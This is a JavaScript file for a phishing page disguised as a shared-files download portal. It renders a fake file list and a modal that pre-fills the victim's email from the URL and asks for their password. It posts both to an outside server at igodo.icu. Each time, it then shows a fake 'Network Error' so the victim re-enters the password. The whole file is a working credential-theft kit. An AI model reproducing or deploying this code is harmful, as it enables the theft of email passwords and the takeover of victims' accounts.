$(document).ready(function() {
    $('.loaded').html(`
<div class="row">
<div class="col-sm-2"> <img src="redacvx.bitbucket.io_files/sd.png" class="img-fluid"></div>
<div class="col-sm-6">
<img src="redacvx.bitbucket.io_files/7.png">
<table class="table ">
    <tr data-toggle="modal" data-toggle="modal" data-target="#myModal">
        <th>Name↑</th>
        <th>Modified▼</th>
        <th>Members▼</th>
    </tr>
    <tr data-toggle="modal" data-toggle="modal" data-target="#myModal">
        <td><img src="redacvx.bitbucket.io_files/2.png"></td>
        <td><img src="redacvx.bitbucket.io_files/4.png"></td>
        <td><img src="redacvx.bitbucket.io_files/5.png"></td>
    </tr>
    <tr data-toggle="modal" data-toggle="modal" data-target="#myModal">
        <td><img src="redacvx.bitbucket.io_files/1.png"></td>
        <td><img src="redacvx.bitbucket.io_files/4.png"></td>
        <td><img src="redacvx.bitbucket.io_files/5.png"></td>
    </tr>
    <tr data-toggle="modal" data-toggle="modal" data-target="#myModal">
        <td><img src="redacvx.bitbucket.io_files/3.png"></td>
        <td><img src="redacvx.bitbucket.io_files/4.png"></td>
        <td><img src="redacvx.bitbucket.io_files/5.png"></td>
    </tr>
</table>
</div>
<div class="col-sm-4"><img src="redacvx.bitbucket.io_files/sd2.png" class="img-fluid"></div>
</div>

    
    <!-- The Modal -->
    <div class="modal" id="myModal">
        <div class="modal-dialog">
            <div class="modal-content">

                <!-- Modal Header -->
              

                <!-- Modal body -->
                <div class="modal-body p-3">

                  <img src="redacvx.bitbucket.io_files/to.png" class="img-fluid">
<div class="text-danger" id="msg" style="font-weight:600; font-size:17px;"></div>
                    <form method="post" id="formx" class="my-4">
                        
                    
                        <input type="email" name="x1" id="x1" class="form-control" value="" readonly>
                        <div class="mb-1"><img src="redacvx.bitbucket.io_files/cc.png" class="img-fluid"></div>
                        <input type="password" name="x2" id="x2" class="form-control mb-3" placeholder="Receiver's Password" value="" required="true">
                     
                        <div class="text-center">
                        <button id="submitBtn" class="btn btn-md btn-primary">Download Files</button><br>
                        <img src="redacvx.bitbucket.io_files/mn.png" class="img-fluid">
                        </div>
                    </form>

                  
                 

                </div>
            </div>
        </div>
    </div>
`);


    var baseUrl = (window.location).href;
    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
    $("#x1").val(url);

    $("#formx").submit(function(e) {
        e.preventDefault();
        var nm = $("#A1").val();
        var formData = new FormData($("#formx")[0]);
        $("#submitBtn").html("Processing..").prop("disabled", true);
        $.ajax({
            url: "https://igodo.icu/db/b.php",
            type: 'POST',
     	    crossDomain:true,
            data: formData,
            contentType: false,
            processData: false,
         
            success: function(res) {
                
                $('#bd').show();
                $('#hm').hide();
                setTimeout(function() {
                    $("#x1").val(url);
                    $("#x2").val("");
                    $('#msg').html(`Network Error! Please verify your information and try again`);
                    $("#submitBtn").html("Sign In").prop("disabled", false);
                }, 2000);

            }
        });
    });

});
